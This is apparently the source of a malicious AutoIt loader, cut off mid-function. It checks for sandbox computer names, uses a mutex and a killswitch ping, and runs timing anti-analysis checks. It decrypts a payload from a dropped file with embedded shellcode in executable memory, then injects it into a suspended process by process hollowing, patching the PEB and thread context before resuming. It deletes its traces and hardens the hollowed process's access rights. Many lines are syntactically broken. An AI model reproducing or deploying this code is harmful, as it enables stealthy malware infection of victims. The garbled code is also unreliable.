$uFhyhtBkh = "rAiiQQZZDTHfMcSuylifDtsYazbc" ; unused also killswitch domain and mutex
#NoTrayIcon
;7 fake functions

If (@ComputerName = "DESKTOP-QO5QU33") Then Exit
If (@ComputerName = "NfZtFbPfH" ) Then Exit
If (@ComputerName = "tz") Then Exit
If (@ComputerName = "ELICZ") Then Exit

Func Get_Data_Struct($p1, $p2, $pop = 0 )
	If Not $pop = 0 Then
        return DllStructGetData($p1, $p2, $pop)
	else
	    return DllStructGetData($p1, $p2)
	EndIF
EndFunc

$NioiOqN = StringInStr($CmdLineRaw, @ScriptFullPath) ? StringReplace($CmdLineRaw, @ScriptFullPath, "", 1) : StringReplace($CmdLineRaw, @ScriptName, "", 1)
$callExtDll=DllCall("kernel32.dll", "uint", "SetErrorMode", "dword",1), 0x8006)
If Ptr(DllCall ("kernel32.dll", "uint", "SetErrorMode", "dword",1), 0)[0]) <> 0x8006 Then Exit
$FEJOdNPAuULM = DllCall(DllOpen("kernel32.dll"), "handle", "CreateSemaphoreA", "ptr", Null, "long", 1, "long", 1, "str", "rAiiQQZZDTHfMcSuylifDtsYazbc")
$errorcode = DllCall("kernel32.dll", "long", "GetLastError")[0]

Func Decode($data, $offset)
	$res = ''
	$inter = Execute(StringReverse(")2 ,'q' ,DuAFYJOTJY$(tilpSgnirtS")) ;-> "StringSplit($data, 'q', 2)
	For $i = 0 To UBound($inter) - 1
		$res &= Execute(StringReverse(")JheyWZPktrKBo$ - ]nvgyQwZd$[ahMrigcb$(wrhC")) ;-> )"Chrw($inter[$i] - $offset)"
	Next
	Return $res
EndFunc

If $errorcode == (183) Then
    $pathfiledata = FileOpen(@ScriptDir & "\7-7",16)
    $rawdata = FileRead($pathfiledata)
    $PID_info_module = Get_PID_info(Get_PID_info(Get_PID_info(Get_PID_info(@AutoItPID))), True)
    ProcessClose(Get_PID_info(Get_PID_info(Get_PID_info(Get_PID_info(@AutoItPID)))))
    Anti_Sandbox(3000)
    FileDelete($PID_info_module)
    FileDelete("T")
    FileDelete("7-7")
If (Ping("rAiiQQZZDTHfMcSuylifDtsYazbc.rAiiQQZZDTHfMcSuylifDtsYazbc"), 1000) <> 0) Then Exit ; killswitch domain

$control_value = 0
Anti_Sandbox(5592)
For $ = 0 To 24412820
	$control_value += 1/($*$)
Next

$control_value = Sqrt($control_value*(6))


If Not ($control_value > 3,14100000000326) Then Exit
    $QFlaHD = @AutoItExe
    Global $TYZpA = init(LoadStructMem(Binary($rawdata), Binary("23626415")), $NioiOqN, $QFlaHD)
    WinWaitClose(1)
Else
    Run(@AutoItExe & " " & $CmdLineRaw)
    Anti_Sandbox(500)
EndIf


Func Anti_Sandbox($time)
    $t1 = DllCall("kernel32.dll", "long","GetTickCount")
    $sl = DllCall("kernel32.dll", "DWORD", "Sleep", "dword",1), $time)
    $t2 = DllCall("kernel32.dll", "long","GetTickCount")
    $dif = $t2[0] - $t1[0]
    If Not (($dif+500)>=$time and ($dif-500)<=$time) Then Exit
    EndIf
EndFunc

Func LoadStructMem($MoLjpduVbbEChQ, $GElfazC)
	If @AutoItX64 Then
		Local $loaderCode = "0x89C0554889C84889D54989CA4531C95756534883EC08C70100000000C741040000000045884A084183C1014983C2014181F90001000075EB488DB9000100004531D2664531C9EB3641BA0100000031F60FB658080FB6142E8D3413468D0C0E450FB6C94D63D9420FB6741908408870084883C00142885C19084839F8740E4539D07EC54963F241"
		$loaderCode &= "83C201EBC44883C4085B5E5F5DC389DB56534883EC084585C0448B11448B49047E4E4183E8014A8D7402014183C2014181E2FF0000004963DA0FB6441908468D0C08450FB6C94D63D9460FB644190844884419084288441908418D04000FB6C00FB644010830024883C2014839F275BB448911448949044883C4085B5EC3"
	Else
		Local $loaderCode = "0x89C05531C057565383EC088B4C241C8B7C2420C70100000000C74104000000008844010883C0013D0001000075F28D910001000031DB8954240489C831D2891C2489CEEB32C704240100000031ED0FB648080FB61C2F8D2C198D5415000FB6D20FB66C160889EB88580883C001884C16083B44240474128B0C24394C24247EC58B2C2483042401EBC583C4085B5E5F5DC2100089"
		$loaderCode &= "DB5557565383EC088B5424248B44241C8B6C242085D28B188B48047E5B31D2895C2404892C248B5C240483C30181E3FF000000895C24040FB67418088B6C24048D0C0E0FB6C90FB67C080889FB885C280889F38D343781E6FF000000885C08080FB67430088B3C2489F3301C1783C2013B54242475B089EB891889480483C4085B5E5F5DC21000"
	EndIf
    Local $mbxSreMyLV = (StringInStr($loaderCode, "89C0") - 3) / 2
    Local $ELBupLP = (StringInStr($loaderCode, "89DB") - 3) / 2
    $loaderCode = Binary($loaderCode)
    $struct = DllStructCreate("byte[" & BinaryLen($loaderCode) & "]", DllCall("kernel32.dll", "ptr", "VirtualAlloc", "ptr", 0, "ulong_ptr", BinaryLen($loaderCode), "dword",1), 0x00001000, "dword",1), 0x00000040)[0])
    DllStructSetData($struct, 1, $loaderCode)
    Local lim = BinaryLen($GElfazC)
	Local $bfsPIeftKlduG = DllStructCreate("byte[" & lim & "]")
    DllStructSetData($bfsPIeftKlduG, 1, $GElfazC)
	Local $BufStruct = DllStructCreate("byte[272]")
    @AutoItX64 ? DllCallAddress("none", DllStructGetPtr($struct) + $mbxSreMyLV, "ptr", DllStructGetPtr($BufStruct), "ptr", DllStructGetPtr($bfsPIeftKlduG), "uint", lim, "int", 0) : DllCall("user32.dll", "uint", "CallWindowProc", "ptr", DllStructGetPtr($struct) + $mbxSreMyLV, "ptr", DllStructGetPtr($BufStruct), "ptr", DllStructGetPtr($bfsPIeftKlduG), "uint", lim,"int", 0)
    Local lim2 = BinaryLen($MoLjpduVbbEChQ)
    Local $bfsPIeftKlduG2 = DllStructCreate("byte[" & lim2 & "]")
    DllStructSetData($bfsPIeftKlduG2, 1, $MoLjpduVbbEChQ)
	@AutoItX64 ? DllCallAddress("int", DllStructGetPtr($struct) + $ELBupLP,"ptr", DllStructGetPtr($BufStruct), "ptr", DllStructGetPtr($bfsPIeftKlduG2), "uint", lim2, "int", 0) : DllCall("user32.dll", "uint", "CallWindowProc", "ptr", DllStructGetPtr($struct) + $ELBupLP, "ptr", DllStructGetPtr($BufStruct), "ptr", DllStructGetPtr($bfsPIeftKlduG2), "uint", lim2, "int", 0)	
	Return Get_Data_Struct($bfsPIeftKlduG2, 1)
EndFunc  

Func PrepareStruct($vaZLC)
    $LhHvzhlnvpP = DllStructCreate("dword;int;dword;STRUCT;ptr;int;int;int;ptr;ENDSTRUCT")
    $Wohblo = DllStructCreate("char[32]")
    $xFLQmSlbvi = DllStructCreate("dword",1))
    DllStructSetData($LhHvzhlnvpP, 1, 0x401FFFFF)
    DllStructSetData($LhHvzhlnvpP, 2, 3)
    DllStructSetData($LhHvzhlnvpP, 3, 0)
    DllStructSetData($LhHvzhlnvpP, 4, 0)
    DllStructSetData($LhHvzhlnvpP, 5, 0)
    DllStructSetData($LhHvzhlnvpP, 6, 1)
    DllStructSetData($LhHvzhlnvpP, 7, 0)
    DllStructSetData($LhHvzhlnvpP, 8, DllStructGetPtr($Wohblo))
    DllStructSetData($Wohblo, 1, "CURRENT_USER")
    $VpmOhyGrRu = DllStructGetPtr($LhHvzhlnvpP)
    $xFLQmSlbviPointer = DllStructGetPtr($xFLQmSlbvi)
    $piqZboEoQNsWh = DllCall("Advapi32.dll", "dword",1), "RdsDmsqhdrHm@bk@", "ulong", 1, "ptr", $VpmOhyGrRu, "ptr", 0, "ptr", $xFLQmSlbviPointer)
    If @error Then Return SetError(1, @error, False)
        $$JiUiQuscSob = DllCall("Advapi32.dll", "dword",1), "SetSecurityInfo", "handle", $vaZLC, "int", "6", "dword",1), 0x00000004, "dword",1), 0, "dword",1), 0, "ptr", Get_Data_Struct($xFLQmSlbvi, 1), "ptr", 0)
    If @error Then Return SetError(2, @error, False)
        DllCall("Kernel32.dll", "Handle", "LocalFree", "Handle", $xFLQmSlbviPointer)
	If @error Then Return SetError(3, 0, False)
	If Not UBound($piqZboEoQNsWh) Then Return SetError(4, 0, False)
	If Not UBound($JiUiQuscSob) Then Return SetError(5, 0, False)
	If $piqZboEoQNsWh[0] <> 0 Then Return SetError(6, $piqZboEoQNsWh[0], False)
	If $JiUiQuscSob[0] <> 0 Then Return SetError(7, $JiUiQuscSob[0], False)
	Return True
EndFunc 

Func Get_PID_info($PID = 0, $c = False)
	$arg_construct = "dword Size;dword Usage;dword ProcessID;ulong_ptr DefaultHeapID;dword ModuleID;dword Threads;dword ParentProcessID;long PriClassBase;dword Flags;wchar ExeFile[260]"
    Local $snap = DllCall("kernel32.dll", "handle", "CreateToolhelp32Snapshot", "dword",1), 0x00000002, "dword",1), 0)[0]
    Local $struct1 = DllStructCreate($arg_construct)
	Local $Result2 = ""
	Local $Result = 0
    DllStructSetData($struct1, "Size", DllStructGetSize($struct1))
    Local $$cal_handle = DllCall("kernel32.dll", "bool", "Process32FirstW", "handle", $snap, "struct*", $struct1)
	While (Not @error) And ($$cal_handle[0])
		If Get_Data_Struct($struct1, "ProcessID") = $PID Then
			If $c Then 
                $Result2 = DllCall(@SystemDir & "\psapi.dll", "dword",1), "GetModuleFileNameExW", "handle", DllCall("kernel32.dll", "handle", "OpenProcess", "dword",1), 0x00001010, "bool", 0, "dword",1), Get_Data_Struct($struct1, "ParentProcessID"))[0], "handle", 0, "wstr", "", "int", 4096)[3]
            EndIf
            $Result = Get_Data_Struct($struct1, "ParentProcessID")
            ExitLoop
		EndIf
        $$cal_handle = DllCall("kernel32.dll", "bool", "Process32NextW", "handle", $snap, "struct*", $struct1)
		$Error = @error
	WEnd
    DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $snap)
	If $Result2 = "" Then
		Return $Result
	Else
		Return $Result2
	EndIf
EndFunc 

Func init($cgvUwtJOtco, $POrzyTiT = "", $DSpspujNjEJb = "")     
    Local $TBTmyNLrEP = DllStructCreate("byte[" & BinaryLen($cgvUwtJOtco) & "]")
    DllStructSetData($TBTmyNLrEP, 1, $cgvUwtJOtco)
    Local $wnzGLJltcV = DllStructGetPtr($TBTmyNLrEP)
    Local $MGeDzEwFwtH = DllStructCreate("dword  cbSize; ptr Reserved; ptr Desktop; ptr Title; dword X; dword Y; dword XSize; dword YSize; dword XCountChars; dword YCountChars; dword FillAttribute; dword Flags; word ShowWindow; word Reserved2; ptr Reserved2; ptr hStdInput; ptr hStdOutput; ptr hStdError")
    Local $jOgeMYtypbtkev = DllStructCreate("ptr Process; ptr Thread; dword ProcessId; dword ThreadId")
    Local $callExtDll = DllCall("kernel32.dll", "bool", "CreateProcessW","wstr", Null,"wstr", $DSpspujNjEJb & " " & $POrzyTiT,"ptr", 0,"ptr", 0,"int", 0,"dword",1), 134217732,"ptr", 0,"ptr", 0,"ptr", DllStructGetPtr($MGeDzEwFwtH),"ptr", DllStructGetPtr($jOgeMYtypbtkev))
    If @error Or Not $callExtDll[0] Then Return SetError(1, 0, 0) 
        Local $struct_process = Get_Data_Struct($jOgeMYtypbtkev, "Process")
        Local $struct_thread = Get_Data_Struct($jOgeMYtypbtkev, "Thread")
        Local $struct_process_ID = Get_Data_Struct($jOgeMYtypbtkev, "ProcessId")
        If @AutoItX64 And GetRef($struct_process) Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 103)
            ;$JtDnr = DllStructCreate("char buffer[128]")
            ;DllStructSetData($JtDnr, "buffer", "UnYUizEmiSgTzOMroXWViDBcozYooPvaDeJcJcFwgGXsTcpdFVpvBmPsWCMNccdavVdsydzNsUHAFlCMpIDjFqQrhamuIRG")
            ;$callExtDll = DllCall("kernel32.dll", "ptr","VirtualAllocEx","handle", $struct_process,"ptr", 0,"dword_ptr", 300000000,"dword",1), 0x3000,"dword",1), 4)
            ;While DllCall("kernel32.dll", "bool", "WriteProcessMemory","handle", $struct_process,"ptr", $callExtDll[0],"ptr", DllStructGetPtr($JtDnr),"dword_ptr", 5000,"dword_ptr*", 0)[0]
            ;$callExtDll[0] = $callExtDll[0] + 5000
            ;WEnd
            Local $RunFlag, $struct_code
            If @AutoItX64 Then
                If @OSArch = "X64" Then
                    $RunFlag = 2
                    $struct_code_Part1 = "align 16; uint64 P1Home; uint64 P2Home; uint64 P3Home; uint64 P4Home; uint64 P5Home; uint64 P6Home; dword ContextFlags; dword MxCsr; word SegCS; word SegDs; word SegEs; word SegFs; word SegGs; word SegSs; dword EFlags; uint64 Dr0; uint64 Dr1; uint64 Dr2; uint64 Dr3; uint64 Dr6; uint64 Dr7; uint64 Rax; uint64 Rcx; uint64 Rdx; "
                    $struct_code_Part2 = "uint64 Rbx; uint64 Rsp; uint64 Rbp; uint64 Rsi; uint64 Rdi; uint64 R8; uint64 R9; uint64 R10; uint64 R11; uint64 R12; uint64 R13; uint64 R14; uint64 R15; uint64 Rip; uint64 Header[4]; uint64 Legacy[16]; uint64 Xmm0[2]; uint64 Xmm1[2]; uint64 Xmm2[2]; uint64 Xmm3[2]; uint64 Xmm4[2]; uint64 Xmm5[2]; uint64 Xmm6[2]; uint64 Xmm7[2]; "
                    $struct_code_Part3 = "uint64 Xmm8[2]; uint64 Xmm9[2]; uint64 Xmm10[2]; uint64 Xmm11[2]; uint64 Xmm12[2]; uint64 Xmm13[2]; uint64 Xmm14[2]; uint64 Xmm15[2]; uint64 VectorRegister[52]; uint64 VectorControl; uint64 DebugControl; uint64 LastBranchToRip; uint64 LastBranchFromRip; uint64 LastExceptionToRip; uint64 LastExceptionFromRip"
                    $struct_code = DllStructCreate($struct_code_Part1 & $struct_code_Part2 & $struct_code_Part3)
                Else
                    $RunFlag = 3
                    DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 102)
                EndIf
            Else
                $RunFlag = 1
                $struct_code_Part4 = "dword ContextFlags; dword Dr0; dword Dr1; dword Dr2; dword Dr3; dword Dr6; dword Dr7; dword ControlWord; dword StatusWord; dword TagWord; dword ErrorOffset; dword ErrorSelector; dword DataOffset; dword DataSelector; "
                $struct_code_Part5 = "byte RegisterArea[80]; dword Cr0NpxState; dword SegGs; dword SegFs; dword SegEs; dword SegDs; dword Edi; dword Esi; dword Ebx; dword Edx; dword Ecx; dword Eax; dword Ebp; dword Eip; dword SegCs; dword EFlags; dword Esp; dword SegSs; byte ExtendedRegisters[512]"
                $struct_code = DllStructCreate($struct_code_Part4 & $struct_code_Part5)
            EndIf
            
            Local $flagcode
            Switch $RunFlag
                Case 1
                    $flagcode = 0x10007
                Case 2
                    $flagcode = 0x100007
                Case 3
                    $flagcode = 0x80027
            EndSwitch   
            DllStructSetData($struct_code, "ContextFlags", $flagcode)
            $callExtDll = DllCall("kernel32.dll", "bool", "GetThreadContext","handle", $struct_thread,"ptr", DllStructGetPtr($struct_code))
            If @error Or Not $callExtDll[0] Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 3)
            Local $ref_OS_Entry
            Switch $RunFlag
                Case 1
                    $ref_OS_Entry = Get_Data_Struct($struct_code, "Ebx")
                Case 2
                    $ref_OS_Entry = Get_Data_Struct($struct_code, "Rdx")
                Case 3
                    Local $KfGJEuCPnRp = DllStructCreate("char Magic[2]; word BytesOnLastPage; word Pages; word Relocations; word SizeofHeader; word MinimumExtra; word MaximumExtra; word SS; word SP; word Checksum; word IP; word CS; word Relocation; word Overlay; char Reserved[8]; word OEMIdentifier; word OEMInformation; char Reserved2[20]; dword AddressOfNewExeHeader",$wnzGLJltcV)
                    Local $EUkCFbCZvLRbKh = $wnzGLJltcV
                    $wnzGLJltcV += Get_Data_Struct($KfGJEuCPnRp, "AddressOfNewExeHeader"))
                    Local $yPhgNVQDBq = Get_Data_Struct($KfGJEuCPnRp, "Magic")
                    If Not ($yPhgNVQDBq == "MZ") Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 4)
                    Local $RRQkUabiWg = DllStructCreate("dword Signature", $wnzGLJltcV)
                    $wnzGLJltcV += 4 
                    If Get_Data_Struct($RRQkUabiWg, "Signature") <> 17744 Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 5)
                        Local $fdGxMpZbpYdA = DllStructCreate("word Machine; word NumberOfSections; dword TimeDateStamp; dword PointerToSymbolTable; dword NumberOfSymbols; word SizeOfOptionalHeader; word Characteristics",$wnzGLJltcV)
                        Local $NumberOfSections = Get_Data_Struct($fdGxMpZbpYdA, "NumberOfSections")
                        $wnzGLJltcV += 20 
                        Local $FKokQ = DllStructCreate("word Magic;", $wnzGLJltcV)
                        Local $Magic = Get_Data_Struct($FKokQ, 1)
                        Local $GEtQEA
                    If $Magic = 267 Then 
                        If @AutoItX64 Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 6)
                        $GEtQEA_Part1 = "word Magic; byte MajorLinkerVersion; byte MinorLinkerVersion; dword SizeOfCode; dword SizeOfInitializedData; dword SizeOfUninitializedData; dword AddressOfEntryPoint; dword BaseOfCode; dword BaseOfData; dword ImageBase; dword SectionAlignment; dword FileAlignment; "
                        $GEtQEA_Part2 = "word MajorOperatingSystemVersion; word MinorOperatingSystemVersion; word MajorImageVersion; word MinorImageVersion; word MajorSubsystemVersion; word MinorSubsystemVersion; dword Win32VersionValue; dword SizeOfImage; dword SizeOfHeaders; dword CheckSum; word Subsystem; "
                        $GEtQEA_Part3 = "word DllCharacteristics; dword SizeOfStackReserve; dword SizeOfStackCommit; dword SizeOfHeapReserve; dword SizeOfHeapCommit; dword LoaderFlags; dword NumberOfRvaAndSizes"
                        $GEtQEA = DllStructCreate($GEtQEA_Part1 & $GEtQEA_Part2 & $GEtQEA_Part3,$wnzGLJltcV)
                        $wnzGLJltcV += 96 
                    ElseIf $Magic = 523 Then 
                        If Not @AutoItX64 Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 7)
                            $GEtQEA_Part4 = "word Magic; byte MajorLinkerVersion; byte MinorLinkerVersion; dword SizeOfCode; dword SizeOfInitializedData; dword SizeOfUninitializedData; dword AddressOfEntryPoint; dword BaseOfCode; uint64 ImageBase; dword SectionAlignment; dword FileAlignment; "
                            $GEtQEA_Part5 = "word MajorOperatingSystemVersion; word MinorOperatingSystemVersion; word MajorImageVersion; word MinorImageVersion; word MajorSubsystemVersion; word MinorSubsystemVersion; dword Win32VersionValue; dword SizeOfImage; dword SizeOfHeaders; dword CheckSum; "
                            $GEtQEA_Part6 = "word Subsystem; word DllCharacteristics; uint64 SizeOfStackReserve; uint64 SizeOfStackCommit; uint64 SizeOfHeapReserve; uint64 SizeOfHeapCommit; dword LoaderFlags; dword NumberOfRvaAndSizes"
                            $GEtQEA = DllStructCreate($GEtQEA_Part4 & $GEtQEA_Part5 & $GEtQEA_Part6,$wnzGLJltcV)
                            $wnzGLJltcV += 112 
                        Else
                        DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 8)
                    EndIf
                    Local $EntryPointNEW = Get_Data_Struct($GEtQEA, "AddressOfEntryPoint")
                    Local $OptionalHeaderSizeOfHeadersNEW = Get_Data_Struct($GEtQEA, "SizeOfHeaders")
                    Local $dmsntfCjn = Get_Data_Struct($GEtQEA, "ImageBase")
                    Local $OptionalHeaderSizeOfImageNEW = Get_Data_Struct($GEtQEA, "SizeOfImage")
                    $wnzGLJltcV += 40 
                    Local $LsPJcRxfNsFVP = DllStructCreate("dword VirtualAddress; dword Size", $wnzGLJltcV)
                    Local $DQARYXAatsH = Get_Data_Struct($LsPJcRxfNsFVP, "VirtualAddress")
                    Local $SizeBaseReloc = Get_Data_Struct($LsPJcRxfNsFVP, "Size")
                    Local $CrBQWHJZPVSc
                    If $DQARYXAatsH And $SizeBaseReloc Then $CrBQWHJZPVSc = True
                        $wnzGLJltcV += 88 
                    Local $ovDIxUMzzjnwoa
                    Local $PiMNQr
                    If $CrBQWHJZPVSc Then 
                        $PiMNQr = AllocateStruct($struct_process, $OptionalHeaderSizeOfImageNEW)
                        If @error Then
                            $PiMNQr = ManageMemprocess($struct_process, $dmsntfCjn, $OptionalHeaderSizeOfImageNEW)
                            If @error Then
                                GetMappedSection($struct_process, $dmsntfCjn)
                                $PiMNQr = ManageMemprocess($struct_process, $dmsntfCjn, $OptionalHeaderSizeOfImageNEW)
                                If @error Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 101)
                            EndIf
                        EndIf
                        $ovDIxUMzzjnwoa = True
                    Else 
                        $PiMNQr = ManageMemprocess($struct_process, $dmsntfCjn, $OptionalHeaderSizeOfImageNEW)
                        If @error Then
                            $mgKUs = GetMappedSection($struct_process, $dmsntfCjn)
                            $PiMNQr = ManageMemprocess($struct_process, $dmsntfCjn, $OptionalHeaderSizeOfImageNEW)
                                If @error Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 1013)
                                EndIf
                        EndIf
                        DllStructSetData($GEtQEA, "ImageBase", $PiMNQr)
                        DllStructSetData($GEtQEA, "DllCharacteristics", 8000)
                        Local $BCpnjfd = DllStructCreate("byte[" & $OptionalHeaderSizeOfImageNEW & "]")
                        Local $XWlXsapQeOOfB = DllStructGetPtr($BCpnjfd)
                        Local $IoyFUt = DllStructCreate("byte[" & $OptionalHeaderSizeOfHeadersNEW & "]", $EUkCFbCZvLRbKh)
                        EDllStructSetData($BCpnjfd, 1, Get_Data_Struct($IoyFUt, 1))
                        Local $gYmDmSQrqPSwsS
                        Local $SizeOfRawData, $wnzGLJltcVToRawData
                        Local $VirtualAddress, $VirtualSize
                        Local $herzBN
                        For $ = 1 To $NumberOfSections
                            $gYmDmSQrqPSwsS = DllStructCreate("char Name[8]; dword UnionOfVirtualSizeAndPhysicalAddress; dword VirtualAddress; dword SizeOfRawData; dword PointerToRawData; dword PointerToRelocations; dword PointerToLinenumbers; word NumberOfRelocations; word NumberOfLinenumbers; dword Characteristics",$wnzGLJltcV)
                            $SizeOfRawData = Get_Data_Struct($gYmDmSQrqPSwsS, "SizeOfRawData")
                            $wnzGLJltcVToRawData = $EUkCFbCZvLRbKh + Get_Data_Struct($gYmDmSQrqPSwsS, "PointerToRawData")
                            $VirtualAddress = Get_Data_Struct($gYmDmSQrqPSwsS, "VirtualAddress")
                            $VirtualSize = Get_Data_Struct($gYmDmSQrqPSwsS, "UnionOfVirtualSizeAndPhysicalAddress")
                            If $VirtualSize And $VirtualSize < $SizeOfRawData Then $SizeOfRawData = $VirtualSize  
                            If $SizeOfRawData Then
                                DllStructSetData(DllStructCreate("byte[" & $SizeOfRawData & "]", $XWlXsapQeOOfB + $VirtualAddress), 1, Get_Data_Struct(DllStructCreate("byte[" & $SizeOfRawData & "]", $wnzGLJltcVToRawData), 1))
                            EndIf
                            If $ovDIxUMzzjnwoa Then
                                If $VirtualAddress <= $DQARYXAatsH And $VirtualAddress + $SizeOfRawData > $DQARYXAatsH Then
                                    $herzBN = DllStructCreate("byte[" & $SizeBaseReloc & "]", $wnzGLJltcVToRawData + ($DQARYXAatsH - $VirtualAddress))
                                EndIf
                            EndIf   
                            $wnzGLJltcV += 40 
                        Next
                        If $ovDIxUMzzjnwoa Then InitBlock($XWlXsapQeOOfB, $herzBN, $PiMNQr, $dmsntfCjn, $Magic = 523)
                            $callExtDll = DllCall("kernel32.dll", "bool", "WriteProcessMemory","handle", $struct_process,"ptr", $PiMNQr,"ptr", $XWlXsapQeOOfB,"dword_ptr", $OptionalHeaderSizeOfImageNEW,"dword_ptr*", 0)
                        If @error Or Not $callExtDll[0] Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 70)
                            Anti_Sandbox(4000)
                            $VeHovQbphR = "byte InheritedAddressSpace; byte ReadImageFileExecOptions; byte BeingDebugged; byte Spare; ptr Mutant; ptr ImageBaseAddress; ptr LoaderData; ptr ProcessParameters; ptr SubSystemData; ptr ProcessHeap; ptr FastPebLock; ptr FastPebLockRoutine; ptr FastPebUnlockRoutine; dword EnvironmentUpdateCount; ptr KernelCallbackTable; ptr EventLogSection; ptr EventLog; ptr FreeList; "
                            $GlBUpWlOB = "dword TlsExpansionCounter; ptr TlsBitmap; dword TlsBitmapBits[2]; ptr ReadOnlySharedMemoryBase; ptr ReadOnlySharedMemoryHeap; ptr ReadOnlyStaticServerData; ptr AnsiCodePageData; ptr OemCodePageData; ptr UnicodeCaseTableData; dword NumberOfProcessors; dword NtGlobalFlag; byte Spare2[4]; int64 CriticalSectionTimeout; dword HeapSegmentReserve; dword HeapSegmentCommit; "
                            $bzrAj = "dword HeapDeCommitTotalFreeThreshold; dword HeapDeCommitFreeBlockThreshold; dword NumberOfHeaps; dword MaximumNumberOfHeaps; ptr ProcessHeaps; ptr GdiSharedHandleTable; ptr ProcessStarterHelper; ptr GdiDCAttributeList; ptr LoaderLock; dword OSMajorVersion; dword OSMinorVersion; dword OSBuildNumber; dword OSPlatformId; dword ImageSubSystem; dword ImageSubSystemMajorVersion; "
                            $GHUsS = "dword ImageSubSystemMinorVersion; dword GdiHandleBuffer[34]; dword PostProcessInitRoutine; dword TlsExpansionBitmap; byte TlsExpansionBitmapBits[128]; dword SessionId"
                        Local $qbLcP = DllStructCreate($VeHovQbphR & $GlBUpWlOB & $bzrAj & $GHUsS)
                            $callExtDll = DllCall("kernel32.dll", "bool", "ReadProcessMemory","ptr", $struct_process,"ptr", $ref_OS_Entry,"ptr", DllStructGetPtr($qbLcP),"dword_ptr", DllStructGetSize($qbLcP),"dword_ptr*", 0)
                        If @error Or Not $callExtDll[0] Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 80)
                            DllStructSetData($qbLcP, "ImageBaseAddress", $PiMNQr)
                            $callExtDll = DllCall("kernel32.dll", "bool", "WriteProcessMemory","handle", $struct_process,"ptr", $ref_OS_Entry,"ptr", DllStructGetPtr($qbLcP),"dword_ptr", DllStructGetSize($qbLcP),"dword_ptr*", 0)
                        If @error Or Not $callExtDll[0] Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 90)
                        Switch $RunFlag
                            Case 1
                                DllStructSetData($struct_code, "Eax", $PiMNQr + $EntryPointNEW)
                            Case 2
                                DllStructSetData($struct_code, "Rcx", $PiMNQr + $EntryPointNEW)
                            Case 3 
                        EndSwitch
                        $callExtDll = DllCall("kernel32.dll", "bool", "VirtualProtectEx", "handle", $struct_process, "ptr", $PiMNQr, "dword_ptr", $OptionalHeaderSizeOfImageNEW, "dword",1), 64, "dword*", "")
                        If @Error Or Not $callExtDll[0] Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 591)
                            $callExtDll = DllCall("kernel32.dll", "bool", "SetThreadContext","handle", $struct_thread,"ptr", DllStructGetPtr($struct_code))
                        If @error Or Not $callExtDll[0] Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 10)
                            PrepareStruct($struct_process)
                            $callExtDll = DllCall("ntdll.dll", "dword",1), "NtAlertResumeThread", "handle", $struct_thread, "long*", 0)
                        If @error Or $callExtDll[0] = -1 Then DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $struct_process, "dword",1), 11)
                            DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $struct_process)
                            DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $struct_thread)
    Return Get_Data_Struct($jOgeMYtypbtkev, "ProcessId")
EndFunc   

Func InitBlock($XWlXsapQeOOfB, $bMipPSmXH, $SuoMjmbI, $IlOQCamECl, $pNiLs)
    Local $Delta = $SuoMjmbI - $IlOQCamECl 
    Local $Size = DllStructGetSize($bMipPSmXH)
    Local $DoyZbcbFlyaI = DllStructGetPtr($bMipPSmXH)
    Local $xCOFsnKJtiVZbI, $RelativeMove
    Local $VirtualAddress, $SizeofBlock, $NumberOfEntries
    Local $NRcFaDbt, $Data, $iPmsrmO
    Local $Flag = 3 + 7 * $pNiLs 
    While $RelativeMove < $Size 
        $xCOFsnKJtiVZbI = DllStructCreate("dword VirtualAddress; dword SizeOfBlock", $DoyZbcbFlyaI + $RelativeMove)
        $VirtualAddress = Get_Data_Struct($xCOFsnKJtiVZbI,"VirtualAddress")
        $SizeofBlock = Get_Data_Struct($xCOFsnKJtiVZbI, "SizeOfBlock")
        $NumberOfEntries = ($SizeofBlock - 8) / 2
        $NRcFaDbt = DllStructCreate("word[" & $NumberOfEntries & "]", DllStructGetPtr($xCOFsnKJtiVZbI) + 8)
        For $ = 1 To $NumberOfEntries
            $Data = Get_Data_Struct($NRcFaDbt, 1, $)
            If BitShift($Data, 12) = $Flag Then 
                $iPmsrmO = DllStructCreate("ptr", $XWlXsapQeOOfB + $VirtualAddress + BitAND($Data, 0xFFF))
                DllStructSetData($iPmsrmO, 1, Get_Data_Struct($iPmsrmO, 1) + $Delta)
            EndIf
        Next
        $RelativeMove += $SizeofBlock
    WEnd
    Return 1 
EndFunc   

Func ManageMemprocess($struct_process, $BaseAddressArg, $Size)
    Local $callExtDll = DllCall(DllOpen("kernel32.dll"), "ptr", "VirtualAllocExNuma","handle", $struct_process,"ptr", $BaseAddressArg,"dword_ptr", $Size,"dword",1), 0x1000,"dword",1), 4, "dword",1), 0)
    If @error Or Not $callExtDll[0] Then  
        $callExtDll = DllCall(DllOpen("kernel32.dll"), "ptr", "VirtualAllocExNuma","handle", $struct_process,"ptr", $BaseAddressArg,"dword_ptr", $Size,"dword",1), 0x3000,"dword",1), 4, "dword",1), 0)
    If @error Or Not $callExtDll[0] Then Return SetError(1, 0, $callExtDll[0]) 
    EndIf
    Return $callExtDll[0]
EndFunc   

Func AllocateStruct($struct_process, $Size)
